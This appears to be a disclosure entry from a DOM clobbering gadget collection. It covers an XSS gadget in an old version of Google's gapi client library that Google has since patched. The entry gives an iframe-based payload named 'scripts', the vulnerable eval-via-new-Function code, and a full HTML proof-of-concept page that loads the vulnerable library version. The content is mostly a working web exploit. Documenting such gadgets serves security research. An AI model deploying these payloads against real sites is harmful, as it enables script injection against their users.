## Google Client API

### Meta

+ Library: Google Client API
+ Version: 5BIk7BglYEE
+ Payload: ```<iframe name="scripts" src=”https://api.google.com/js/api.js”>alert("GG!")</iframe><iframe name="scripts" src=”https://api.google.com/js/api.js”>alert("GG!")</iframe>```
+ Impact: XSS
+ Foundby: TheHulk


### Library

URL: 
+ `https://apis.google.com/js/api.js`
+ `https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs`


### Vulnerable Code Snippet

```javascript
var e = document.scripts || document.getElementsByTagName("script") || [];
        d = [];
        var f = [];
        f.push.apply(f, zf("us"));
        for (var h = 0; h < e.length; ++h)
            for (var k = e[h], l = 0; l < f.length; ++l)
                k.src && 0 == k.src.indexOf(f[l]) && d.push(k);
        0 == d.length && 0 < e.length && e[e.length - 1].src && d.push(e[e.length - 1]);
        for (e = 0; e < d.length; ++e)
            d[e].getAttribute("gapi_processed") || (d[e].setAttribute("gapi_processed", !0),
            (f = d[e]) ? (h = f.nodeType,
            f = 3 == h || 4 == h ? f.nodeValue : f.textContent || "") : f = void 0,
            (f = Df(f)) && b.push(f));
        a && Ef(c, a);
```
```javascript
Df = function(a) {
    if (a && !/^\s+$/.test(a)) {
        for (; 0 == a.charCodeAt(a.length - 1); )
            a = a.substring(0, a.length - 1);
        try {
            var b = window.JSON.parse(a)
        } catch (c) {}
        if ("object" === typeof b)
            return b;
        try {
            b = (new Function("return (" + a + "\n)"))()
        } catch (c) {}
        if ("object" === typeof b)
            return b;
        try {
            b = (new Function("return ({" + a + "\n})"))()
        } catch (c) {}
        return "object" === typeof b ? b : {}
    }
}
```

## PoC

Please note that this gadget has been patched by Google through the release of a newer version: [link](https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.6jI6mC1Equ4.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAQ/rs=AHpOoo-79kMK-M6Si-J0E_6fI_9RBHBrwQ/cb=gapi.loaded_0?le=scs). Therefore, initializing `https://apis.google.com/js/api.js` will load the updated script. To demonstrate the DOM clobbering gadgets, we manually load the vulnerable version here.

```
Patched Verison
https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.6jI6mC1Equ4.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAQ/rs=AHpOoo-79kMK-M6Si-J0E_6fI_9RBHBrwQ/cb=gapi.loaded_0?le=scs
```

### PoC #1
```html

<!DOCTYPE html>
<html>
<head>
  <title>Google API Client Example</title>
  <script>
    // Load the Google API client library
    function loadGapi() {
      const script = document.createElement('script');
      script.src = 'https://apis.google.com/js/api.js';
      script.onload = () => initGapi();
      document.body.appendChild(script);
    }

    // Initialize the Google API client library
    function initGapi() {
      gapi.load('client', initClient);
    }

    // Set up the API client and make a request
    function initClient() {}

    // Load the additional script
    function loadAdditionalScript() {
      const script = document.createElement('script');
      script.src = 'https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs';
      document.body.appendChild(script);
    }

    // Initialize the loading process
    function initialize() {
      loadGapi();
      loadAdditionalScript();
    }
  </script>
</head>
<body onload="initialize()">
  <h1>Google Sheets API Client Example</h1>
  // PAYLOAD
  <iframe name="scripts" src="https://api.google.com/js/api.js">alert("GG!")</iframe>
  <iframe name="scripts" src="https://api.google.com/js/api.js">alert("GG!")</iframe>
</body>
</html>
```
